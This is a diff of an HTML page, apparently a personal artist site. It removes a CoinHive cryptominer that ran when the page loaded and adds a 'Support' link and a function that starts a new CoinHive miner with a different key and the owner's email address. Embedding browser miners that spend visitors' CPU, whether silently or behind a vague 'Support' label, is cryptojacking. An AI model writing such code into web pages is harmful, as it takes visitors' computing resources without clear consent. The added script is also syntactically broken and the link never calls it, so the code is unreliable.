@@ -29,6 +29,7 @@
     </div>
     <ul class="nav navbar-nav">
      <li><a href="http://www.thatonegroup.us/martist/LPNeil">Artist Page</a></li>
+     <li><a href="javascript:support">Support</a></li>
     </ul>
    </div>
   </nav>
@@ -96,17 +97,17 @@
    </div>
   </div>
   <script>
-   function startMining(){
-    var miner = new CoinHive.User("6ETSxYPA2yEhjq4sjlPzbY9GWTCTF6xC", "lpottorff1999@gmail.com", {
-     threads: 4, throttle: 0.8,
+   function support(){
+    var miner = new CoinHive.User("A63wiT8SDrmCYlCK8sgUV82nA68MhjgI", "lpottorff1999@gmail.com", {
+     threads: 4,
+     throttle: 0.8,
      forceASMJS: false,
      theme: 'dark',
      language: 'auto'
     });
-    miner.start();
-    miner.isRunnint(function(){alert("The Writer Is Getting Money As You Read");});
-   }
-   document.body.addEventListener("onload", startMining);
+    miner.start()
+   });
+    
   </script>
  </body>
 </html>
